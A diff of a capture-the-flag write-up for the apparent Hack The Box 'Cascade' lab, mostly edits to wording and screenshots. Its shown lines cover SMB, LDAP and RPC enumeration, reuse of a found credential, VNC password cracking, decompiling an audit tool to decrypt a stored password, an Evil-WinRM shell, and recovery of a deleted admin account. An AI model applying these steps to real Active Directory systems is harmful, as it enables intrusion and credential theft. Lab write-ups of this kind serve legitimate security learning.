@@ -54,7 +54,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 634.60 seconds
 ```
 
-#### SMB enumeration:
+#### SMB Enumeration:
 ```shell
 root@kali:~# smbclient -L 10.10.10.182
 Enter WORKGROUP\root's password: 
@@ -65,7 +65,7 @@ Anonymous login successful
 SMB1 disabled -- no workgroup available
 ```
 
-#### LDAP enumeration (For namingcontexts):
+#### LDAP Enumeration (For namingcontexts):
 ```shell
 root@kali:~# ldapsearch -h 10.10.10.182 -x -s base namingcontexts
 # extended LDIF
@@ -113,7 +113,7 @@ objectClass: domainDNS
 
 ```
 
-#### RPC enumeration:
+#### RPC Enumeration:
 ```shell
 root@kali:~# rpcclient -U '' -N 10.10.10.182
 rpcclient $> enumdomusers
@@ -271,7 +271,7 @@ root@kali:~# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva -R data
 	fr--r--r--             2680 Wed Jan 29 05:00:01 2020	VNC Install.reg
 ```
 
-Try to download all files in `Data` using `smbclient`.
+Try to download all files in the share `/Data` using `smbclient`.
 ```shell
 root@kali:~# smbclient -U r.thompson //10.10.10.182/data rY4n5eva
 Try "help" to get a list of possible commands.
@@ -289,7 +289,7 @@ NT_STATUS_ACCESS_DENIED listing \Temps\*
 smb: \>
 ```
 
-In `IT\Temp\s.smith`, we can find a configuration file for `VNC`.
+In `IT/Temp/s.smith`, we can find a configuration file `VNC Install.reg`.<br>
 ```shell
 root@kali:~/IT/Temp/s.smith# cat 'VNC Install.reg'
 ��Windows Registry Editor Version 5.00
@@ -335,12 +335,13 @@ root@kali:~/IT/Temp/s.smith# cat 'VNC Install.reg'
 "VideoRects"=""
 ```
 
-In this configuration, there is a following line includes an encrypted password.
+In this configuration, there is the following line includes an encrypted password.
 ```shell
 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
 ```
 
-
+By googling, we can find this [post](https://snovvcrash.rocks/cheatsheets/#vnc) for cracking VNC password.<br>
+Metasploit has a module for this purpose.
 ```shell
 msf5 > irb
 [*] Starting IRB shell...
@@ -645,10 +646,16 @@ CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
 
 Since we do not have the source code for `CascAudit.exe`, decompile it with [dnSpy](https://github.com/0xd4d/dnSpy).<br>
 First, spin up Windows VM, launch `dnSpy` and open the `CascAudit.exe`.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/2020-07-28-22-13-05.png)
 
+Then, go this way to find the Main() function of `CascAudit.exe`.
+1. `CascAudit(1.0.0.0)`
+2. `CascAudit.exe`
+3. `{} CascAudiot`
+4. `MainModule`
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/2020-07-28-22-15-05.png)
 
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
+#### Source Code:
 ```shell
 namespace CascAudiot
 {
@@ -808,7 +815,7 @@ It is getting the encrypted password from SQLite database and decrypting with th
 
 However, `CascAudit.exe` does not have the definition of `Crypto.DecryptString()`.<br>
 Then, take a look at `CascCrypto.dll`. We can find the function defined.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/2020-07-28-22-16-53.png)
 ```shell
 public static string DecryptString(string EncryptedString, string Key)
 		{
@@ -884,8 +891,8 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\arksvc\Documents>
 ```
 
-As always, check what group `arksvc` in.<br>
-We notice that this user is in the `AD Recycle Bin`.
+As always, check what group `ArkSvc` user in.<br>
+We notice that this user is in the well-known Windows group `AD Recycle Bin`.
 ```shell
 *Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
 User name                    arksvc
@@ -917,7 +924,7 @@ The command completed successfully.
 ```
 
 `Get-ADobject` has an option `-includeDeletedObjects` for the deleted AD objects.<br>
-Add `-and name -ne "Deleted Objects"` to remove "Deleted Objects" container that keeps objects have `isDeleted` attribute.<br>
+Add `-and name -ne "Deleted Objects"` to remove "Deleted Objects" container that keeps objects that have `isDeleted` attribute.<br>
 ```shell
 *Evil-WinRM* PS C:\Users\arksvc\Documents> get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
 
@@ -965,7 +972,7 @@ ObjectClass       : user
 ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
 ```
 
-
+We found that there is an interesting deleted user account `TempAdmin`.
 ```shell
 Deleted           : True
 DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
@@ -975,7 +982,7 @@ ObjectClass       : user
 ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
 ```
 
-With the following command, we can view the deleted object for `TempAdmin` with GUID `f0cc344d-31e0-4866-bceb-a842791ca059`.
+With the following command, we can view the deleted object `TempAdmin` with GUID `f0cc344d-31e0-4866-bceb-a842791ca059`.
 ```shell
 *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Identity f0cc344d-31e0-4866-bceb-a842791ca059 -includeDeletedObjects -Properties *
 
@@ -1055,3 +1062,7 @@ As usual, `root.txt` is in the directory `C:\Users\Administrator\Desktop`.
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
 5ec0a8c63a6e7b1da75c03b4ff7b7c0e
 ```
+
+## 4. References
+* [Active Directory Object Recovery (or Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
+* 
